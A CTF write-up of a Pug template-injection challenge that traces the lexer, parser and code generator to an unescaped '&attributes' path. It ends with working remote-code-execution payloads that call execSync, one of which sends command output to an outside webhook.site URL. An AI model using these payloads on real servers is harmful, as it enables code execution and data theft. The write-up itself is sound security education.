This was the first challenge I solved during the CTF and it was also a first blood, which I was quite happy about.

The code is rather short, and the main part is as follows:

```javascript:index.js
app.post('/render', (req, res) => {
  const { template } = req.body;

  try {
    var lex = require('pug-lexer');
    var parse = require('pug-parser');
    var wrap = require('pug-runtime/wrap');
    var generateCode = require('pug-code-gen');

    const ast = parse(lex(template));
    console.dir(ast);
    const whitelistedNodes = ['Tag', 'Text', 'Comment', 'Block', 'Doctype', 'NamedBlock'];
    const filterNodes = (node) => {
      if (whitelistedNodes.includes(node.type)) {
        if (node.nodes) {
          node.nodes = node.nodes.map(filterNodes).filter(Boolean);
        }
        if (node.block) {
          node.block = filterNodes(node.block);
        }
        return node;
      }
    };
    const filteredAst = filterNodes(ast);
    const validateAttrs = (node) => {
      if (node.attrs) {
        node.attrs.forEach((attr) => {
          if (!/^(['"])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
            throw new Error('Invalid attribute value: ' + attr.val);
          }
        });
      }
      if (node.nodes) {
        node.nodes.forEach(validateAttrs);
      }
      if (node.block) {
        validateAttrs(node.block);
      }
    };
    validateAttrs(filteredAst);
    const code = generateCode(filteredAst);
    console.log(code);
    const html = wrap(code)();

    res.send(html);
  } catch (error) {
    res.status(400).send(`Error rendering template: ${error.message}`);
  }
});
```

So, it is clearly SSTI with some filters (an SSTI jail, if you will). A whitelist instead of a blacklist narrows the search space quite a lot. So I dived right into the [Pug source code](https://github.com/pugjs/pug). Under the `pug/packages` folder, there are 3 main directories of interest: `pug-lexer`, `pug-parser`, and `pug-code-gen`. 

Here is a brief description of my understanding of how it works. A lexer converts raw string input into a sequence of tokens, such as numbers/symbols/identifiers. A parser then takes the sequence of tokens as input and constructs a sort of abstract syntax tree (AST), another abstraction that organises the data further. Finally, the code generator takes this AST and compiles it to javascript code by recursively visiting each node in the tree. This javascript code is then executed server side to produce the final HTML file sent to the client.

So with this in mind, it would be a good idea to start looking in `pug-code-gen` to try and find an entrypoint for us to inject our JS code. I looked up how code is generated for each whitelisted node type. `visitTag` seemed to be the most promising:

```javascript:pug-code-gen/index.js
  visitTag: function(tag, interpolated) {
...

    function bufferName() {
      if (interpolated) self.bufferExpression(tag.expr);
      else self.buffer(name);
    }

...
```

Here, if `interpolated` is true, `this.bufferExpression` is called.

```javascript:pug-code-gen/index.js
  /**
   * Buffer the given `src` so it is evaluated at run time
   *
   * @param {String} src
   * @api public
   */

  bufferExpression: function(src) {
    if (isConstant(src)) {
      return this.buffer(toConstant(src) + '');
    }
    if (
      this.lastBufferedIdx == this.buf.length &&
      this.bufferedConcatenationCount < 100
    ) {
      this.bufferedConcatenationCount++;
      if (this.lastBufferedType === 'text') this.lastBuffered += '"';
      this.lastBufferedType = 'code';
      this.lastBuffered += ' + (' + src + ')';
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + (' +
        this.bufferStartChar +
        this.lastBuffered +
        ');';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + (' + src + ');');
      this.lastBufferedType = 'code';
      this.bufferStartChar = '';
      this.lastBuffered = '(' + src + ')';
      this.lastBufferedIdx = this.buf.length;
    }
  },
```

From this information I deduced that the function is called whenever Pug wants to add raw JS code to the compilation result. It has a sister function `buffer`, which as the documentation suggests wraps the data in a string before adding it to the JS code:

```javascript:pug-code-gen/index.js
  /**
   * Buffer the given `str` exactly as is or with interpolation
   *
   * @param {String} str
   * @param {Boolean} interpolate
   * @api public
   */

  buffer: function(str) {
    var self = this;

    str = stringify(str);
    str = str.substr(1, str.length - 2);

    if (
      this.lastBufferedIdx == this.buf.length &&
      this.bufferedConcatenationCount < 100
    ) {
      if (this.lastBufferedType === 'code') {
        this.lastBuffered += ' + "';
        this.bufferedConcatenationCount++;
      }
      this.lastBufferedType = 'text';
      this.lastBuffered += str;
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + ' +
        this.bufferStartChar +
        this.lastBuffered +
        '";';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + "' + str + '";');
      this.lastBufferedType = 'text';
      this.bufferStartChar = '"';
      this.lastBuffered = str;
      this.lastBufferedIdx = this.buf.length;
    }
  },
```

So it seems like most of the JS code generation is done through these 2 helper functions and thus the vulnerable code, whereever it is, probably calls `bufferExpression`.

Back to `visitTag`, I searched for where it is called with `interpolated = true`. It turns out this is only the case for an `InterpolatedTag` node:

```javascript:pug-code-gen/index.js
  visitInterpolatedTag: function(tag) {
    return this.visitTag(tag, true);
  },
```

However, `InterpolatedTag` is not one of the nodes in our whitelist. So we have to search somewhere else. I searched for all invocations of `this.bufferExpression` in the code (there are about 6). The one that seemed most relevant was in the `visitAttributes` function

```javascript:pug-code-gen/index.js
  visitAttributes: function(attrs, attributeBlocks) {
    if (attributeBlocks.length) {
      if (attrs.length) {
        var val = this.attrs(attrs);
        attributeBlocks.unshift(val);
      }
      if (attributeBlocks.length > 1) {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            this.runtime('merge') +
            '([' +
            attributeBlocks.join(',') +
            ']), ' +
            stringify(this.terse) +
            ')'
        );
      } else {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            attributeBlocks[0] +
            ', ' +
            stringify(this.terse) +
            ')'
        );
      }
    } else if (attrs.length) {
      this.attrs(attrs, true);
    }
  },
```

Recalling the SSTI filter for this challenge, there is also a check done for attributes:

```javascript:index.js
node.attrs.forEach((attr) => {
  if (!/^(['"])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
    throw new Error('Invalid attribute value: ' + attr.val);
  }
});
```

ChatGPT told me that this regex checks that the attribute value is in an unescaped string. I scrutinized the regex and verified this through testing. So we can't inject through tag attributes, however there is the `attributeBlocks` parameter which is clearly injectable! But can we control it? It seems like `attributeBlocks` is a member of `tag`, and I eventually traced it its origin back to `pug-parser`. Here it is initialized in `parseTag`:

```javascript:pug-parser/index.js
  /**
   * tag (attrs | class | id)* (text | code | ':')? newline* block?
   */

  parseTag: function() {
    var tok = this.advance();
    var tag = {
      type: 'Tag',
      name: tok.val,
      selfClosing: false,
      block: this.emptyBlock(tok.loc.start.line),
      attrs: [],
      attributeBlocks: [], // <-- here!
      isInline: inlineTags.indexOf(tok.val) !== -1,
      line: tok.loc.start.line,
      column: tok.loc.start.column,
      filename: this.filename,
    };

    return this.tag(tag, {selfClosingAllowed: true});
  },
```

This attribute is only written to in one function:

```javascript:pug-parser/index.js
  tag: function(tag, options) {
    var seenAttrs = false;
    var attributeNames = [];
    var selfClosingAllowed = options && options.selfClosingAllowed;
    // (attrs | class | id)*
    out: while (true) {
      switch (this.peek().type) {
        ...
        case '&attributes':
          var tok = this.advance();
          tag.attributeBlocks.push({
            type: 'AttributeBlock',
            val: tok.val,
            line: tok.loc.start.line,
            column: tok.loc.start.column,
            filename: this.filename,
          });
          break;
        ...
```

A google search sheds more light onto what this is: [Pug attributes](https://pugjs.org/language/attributes.html#attributes)

```plaintext
Pronounced as “and attributes”, the &attributes syntax can be used to explode an object into attributes of an element.

div#foo(data-bar="foo")&attributes({'data-foo': 'bar'})

<div id="foo" data-bar="foo" data-foo="bar"></div>
```

So after the `&attributes` token, we take the next token and set it as the `val`. And later in `pug-code-gen`, this val is inserted directly into the JS code without validation or stringifying it! I looked into `pug-lexer` to see what type of token would be best suited for this. Then I found the code where an attributeBlock is lexed:

```javascript:pug-lexer/index.js
  /**
   * &attributes block
   */
  attributesBlock: function() {
    if (/^&attributes\b/.test(this.input)) {
      var consumed = 11;
      this.consume(consumed);
      var tok = this.tok('&attributes');
      this.incrementColumn(consumed);
      var args = this.bracketExpression();
      consumed = args.end + 1;
      this.consume(consumed);
      tok.val = args.src;
      this.incrementColumn(consumed);
      this.tokens.push(this.tokEnd(tok));
      return true;
    }
  },
```

As you can see, only a `bracketExpression` is allowed after the `&attributes` token.

```javascript:pug-lexer/index.js
  bracketExpression: function(skip) {
    skip = skip || 0;
    var start = this.input[skip];
    assert(
      start === '(' || start === '{' || start === '[',
      'The start character should be "(", "{" or "["'
    );
```


So we can use `()`, `[]` or `{}` brackets, and the token value will be everything in between. I chose curly brackets so that I could make function calls in the code without ambiguity, and tested the following payload locally:

```plaintext
div&attributes{global.process.mainModule.constructor._load("child_process").execSync('touch pwned.txt')}
```

# Testing environment setup

At this point it may be a good idea to briefly describe how I set up the environment for testing locally. The relevant dockerfiles were provided along with the source code, but I just ran node from my machine because it was faster (and the behavior probably won't have significant changes). I just added two print statements, a `console.dir(ast)` to see the node types, and a `console.log(code)` at the end to check the JS code run.

Going back to the challenge, the payload I submitted worked flawlessly. The problem now is that there isn't a straightforward way to display the command result, so I made a call to a webhook.site.

```plaintext
div&attributes{global.process.mainModule.constructor._load("child_process").execSync('wget https://webhook.site/6964b783-05f8-4a10-be20-817e961902bb?t=`/readflag GIVEFLAGPLS`')}
```

In retrospect, webhook was unnecessary, and I could just as well have done:

```plaintext
input&attributes({value: global.process.mainModule.constructor._load("child_process").execSync('/readflag GIVEFLAGPLS').toString()})
```

In either case, I got the flag: `grey{I_cAn'T_THInK_0F_AnytHing_clever_T0_pu7_h3r3}`.

Overall, quite a cool challenge that tests your code-auditing abilities.
